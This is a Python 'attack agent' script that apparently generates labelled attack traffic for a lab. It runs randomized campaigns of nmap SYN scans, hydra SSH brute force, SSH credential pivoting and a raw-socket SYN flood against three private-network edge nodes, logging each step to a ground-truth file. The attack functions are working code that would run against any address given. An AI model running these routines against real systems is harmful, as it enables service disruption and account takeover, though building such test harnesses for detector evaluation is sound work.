"""
Attack Agent (Person A)

Runs randomized attack campaigns against the edge nodes. Each campaign
independently and randomly chooses:
    - which 2-4 of the 4 attack types occur
    - which node(s) each attack targets
    - timing between stages
    - attack-specific parameters (ddos rate/duration, how many nodes hit)

This means no two runs -- and no two campaigns within the same run -- look
identical. Every action is still logged to the ground truth file with an
exact timestamp.
"""

import os
import time
import json
import random
import socket as pysocket
import threading
import subprocess
import xml.etree.ElementTree as ET
from datetime import datetime, timezone

import paramiko
from scapy.all import IP, TCP

GROUND_TRUTH_PATH = "/data/ground_truth.jsonl"
WORDLIST_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "wordlist.txt")

NODE_IPS = {
    "172.28.0.11": "edge-node-1",
    "172.28.0.12": "edge-node-2",
    "172.28.0.13": "edge-node-3",
}
ALL_IPS = list(NODE_IPS.keys())


def log_ground_truth(stage: str, target: str, detail: str = ""):
    entry = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "stage": stage,
        "target": target,
        "detail": detail,
    }
    with open(GROUND_TRUTH_PATH, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"[attack-agent] {entry}")


# ---------------------------------------------------------------------------
# Port Scan -- now targets a random subset of 1-3 nodes, not always all 3
# ---------------------------------------------------------------------------

def parse_nmap_xml(xml_text: str) -> dict:
    root = ET.fromstring(xml_text)
    results = {}
    for host in root.findall("host"):
        addr_el = host.find("address")
        if addr_el is None:
            continue
        ip = addr_el.get("addr")
        open_ports = []
        ports_el = host.find("ports")
        if ports_el is not None:
            for port in ports_el.findall("port"):
                state = port.find("state")
                if state is not None and state.get("state") == "open":
                    open_ports.append(int(port.get("portid")))
        results[ip] = open_ports
    return results


def run_port_scan(targets: list, top_ports: int = 1000) -> dict:
    print(f"[attack-agent] starting port_scan against {targets}")
    cmd = ["nmap", "-sS", "-p", f"1-{top_ports}", "-oX", "-", *targets]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if result.returncode != 0:
        print(f"[attack-agent] nmap failed: {result.stderr}")
        return {}

    open_ports_by_ip = parse_nmap_xml(result.stdout)

    for ip in targets:
        node_name = NODE_IPS.get(ip, ip)
        log_ground_truth(
            stage="port_scan",
            target=node_name,
            detail=f"open_ports={open_ports_by_ip.get(ip, [])}",
        )

    return open_ports_by_ip


# ---------------------------------------------------------------------------
# Brute Force -- target is a single random node
# ---------------------------------------------------------------------------

def run_brute_force(target_ip: str, username: str = "admin") -> bool:
    node_name = NODE_IPS.get(target_ip, target_ip)
    print(f"[attack-agent] starting brute_force against {node_name} ({target_ip})")

    cmd = [
        "hydra", "-l", username, "-P", WORDLIST_PATH,
        "-t", "4", "-f", "-V", f"ssh://{target_ip}",
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    output = result.stdout + result.stderr
    succeeded = "1 valid password found" in output or "successfully" in output.lower()

    with open(WORDLIST_PATH) as f:
        num_passwords = sum(1 for _ in f)

    log_ground_truth(
        stage="brute_force",
        target=node_name,
        detail=f"username={username} attempts={num_passwords} succeeded={succeeded}",
    )
    return succeeded


# ---------------------------------------------------------------------------
# Lateral Movement -- source and target are both random, and always different
# ---------------------------------------------------------------------------

def run_lateral_movement(source_ip: str, target_ip: str,
                          found_username: str = "admin",
                          found_password: str = "admin123",
                          max_retries: int = 3) -> bool:
    source_node = NODE_IPS.get(source_ip, source_ip)
    target_node = NODE_IPS.get(target_ip, target_ip)
    print(f"[attack-agent] starting lateral_movement: pivoting from {source_node} "
          f"to {target_node} using credentials found on {source_node}")

    succeeded = False
    last_error = None

    for attempt in range(1, max_retries + 1):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                target_ip,
                username=found_username,
                password=found_password,
                timeout=10,
                banner_timeout=15,
                auth_timeout=10,
            )
            succeeded = True
            client.close()
            break
        except paramiko.AuthenticationException:
            succeeded = False
            last_error = "auth_failed"
            break  # this is the expected outcome, no real account exists -- don't retry
        except paramiko.SSHException as e:
            last_error = f"ssh_error:{e}"
            print(f"[attack-agent] lateral_movement attempt {attempt}/{max_retries} "
                  f"hit SSH error: {e} -- retrying" if attempt < max_retries else
                  f"[attack-agent] lateral_movement attempt {attempt}/{max_retries} "
                  f"hit SSH error: {e} -- giving up")
            if attempt < max_retries:
                time.sleep(2)
        except Exception as e:
            last_error = f"connection_error:{e}"
            print(f"[attack-agent] lateral_movement connection error: {e}")
            break

    log_ground_truth(
        stage="lateral_movement",
        target=target_node,
        detail=f"pivoted_from={source_node} username={found_username} "
               f"succeeded={succeeded} last_error={last_error}",
    )
    return succeeded


# ---------------------------------------------------------------------------
# DDoS -- random subset of nodes, random rate, random duration
# ---------------------------------------------------------------------------

def flood_target(target_ip: str, duration: float, rate: float, counts: dict):
    interval = 1.0 / rate
    end_time = time.time() + duration
    sent = 0

    raw_sock = pysocket.socket(pysocket.AF_INET, pysocket.SOCK_RAW, pysocket.IPPROTO_TCP)
    raw_sock.setsockopt(pysocket.IPPROTO_IP, pysocket.IP_HDRINCL, 1)

    try:
        while time.time() < end_time:
            iter_start = time.time()
            pkt = IP(dst=target_ip) / TCP(dport=22, flags="S", sport=random.randint(1024, 65535))
            raw_sock.sendto(bytes(pkt), (target_ip, 0))
            sent += 1
            elapsed = time.time() - iter_start
            remaining = interval - elapsed
            if remaining > 0:
                time.sleep(remaining)
    finally:
        raw_sock.close()

    counts[target_ip] = sent


def run_ddos(targets: list):
    duration = random.uniform(8, 12)
    rate = random.uniform(40, 60)
    print(f"[attack-agent] starting ddos against {targets} "
          f"(rate={rate:.1f}pps/target, duration={duration:.1f}s)")

    counts = {}
    threads = [
        threading.Thread(target=flood_target, args=(ip, duration, rate, counts))
        for ip in targets
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    for ip in targets:
        node_name = NODE_IPS.get(ip, ip)
        log_ground_truth(
            stage="ddos",
            target=node_name,
            detail=f"packets_sent={counts.get(ip, 0)} rate_pps={rate:.1f} duration_s={duration:.1f}",
        )


# ---------------------------------------------------------------------------
# Campaign generator -- genuinely random each time
# ---------------------------------------------------------------------------

def run_one_campaign(campaign_number: int):
    num_stages = random.randint(2, 4)
    stages = random.sample(["port_scan", "brute_force", "lateral_movement", "ddos"], k=num_stages)

    print(f"[attack-agent] campaign #{campaign_number} plan: {stages}")

    for stage in stages:
        if stage == "port_scan":
            num_targets = random.randint(1, 3)
            targets = random.sample(ALL_IPS, k=num_targets)
            run_port_scan(targets)

        elif stage == "brute_force":
            target_ip = random.choice(ALL_IPS)
            run_brute_force(target_ip)

        elif stage == "lateral_movement":
            source_ip, target_ip = random.sample(ALL_IPS, k=2)  # always two distinct nodes
            run_lateral_movement(source_ip, target_ip)

        elif stage == "ddos":
            num_targets = random.randint(1, 3)
            targets = random.sample(ALL_IPS, k=num_targets)
            run_ddos(targets)

        time.sleep(random.uniform(5, 10))

    print(f"[attack-agent] campaign #{campaign_number} complete.")


def main():
    time.sleep(10)

    campaign_number = 1
    while True:
        print(f"[attack-agent] ===== starting campaign #{campaign_number} =====")
        run_one_campaign(campaign_number)

        quiet_period = random.uniform(20, 40)
        print(f"[attack-agent] quiet for {quiet_period:.1f}s before next campaign")
        time.sleep(quiet_period)
        campaign_number += 1


if __name__ == "__main__":
    main()